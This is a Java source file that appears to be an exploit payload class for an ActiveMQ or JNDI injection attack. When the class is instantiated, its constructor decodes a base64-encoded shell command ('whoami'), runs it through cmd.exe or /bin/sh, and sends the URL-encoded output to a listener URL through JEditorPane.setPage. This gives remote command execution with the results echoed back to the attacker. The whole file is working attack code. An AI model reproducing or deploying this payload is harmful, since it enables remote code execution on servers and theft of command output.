package exp;



import java.net.URLEncoder;
import javax.swing.JEditorPane;


public class ActivemqEcho {
	public String url ;
	public String cmd ;
    
	
    public void setAll()  {
    	this.url = "http://127.0.0.1:9998/";
    	this.cmd = "d2hvYW1p"; //whoami
    }
    public ActivemqEcho(){
    	setAll();
    	try {
			cmd = new String(base64_decode(cmd));
	        String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
	        // jndi注入这儿会报错,不知道为什么
	        byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes();
	        String encode = URLEncoder.encode(new String(result), "GBK");
	    	new JEditorPane().setPage(url+"?echo="+encode);
		} catch (Exception e) {
		}

    	
    }
	
    public static byte[] base64_decode(String string) throws Exception {
    	byte[] bytes;
		try {
			try {
				Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
				bytes = (byte[]) Class.forName("java.util.Base64$Decoder").getMethod("decode",String.class).invoke(decoder, string);
			} catch (Exception e) {
				Object decoder = Class.forName("java.util.Base64").getMethod("getMimeDecoder").invoke(null);
				bytes = (byte[]) Class.forName("java.util.Base64$Decoder").getMethod("decode",String.class).invoke(decoder, string);
			}
		} catch (Exception e) {
			bytes = (byte[]) Class.forName("sun.misc.BASE64Decoder").getMethod("decodeBuffer",String.class).invoke(Class.forName("sun.misc.BASE64Decoder").newInstance(), string);
		}
		return bytes;
	}
}
